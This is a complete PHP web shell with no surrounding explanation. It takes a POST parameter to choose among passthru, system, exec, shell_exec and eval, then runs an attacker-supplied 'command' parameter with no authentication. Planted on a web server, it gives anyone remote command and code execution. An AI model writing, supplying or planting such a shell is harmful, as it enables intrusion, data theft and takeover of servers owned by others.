<?php
switch ($_POST["wut"]) {
    case "passthru":
     passthru($_POST["command"]." 2>&1");
     break;
    case "system":
     system($_POST["command"]." 2>&1");
     break;
    case "exec":
     exec($_POST["command"]." 2>&1",$out);
     echo $out;
     break;
    case "shell_exec":
     $out=shell_exec($_POST["command"]." 2>&1");
     echo "$out";
     break;
	case "eval":
     eval($_POST["command"]);
     break;
}	 
?>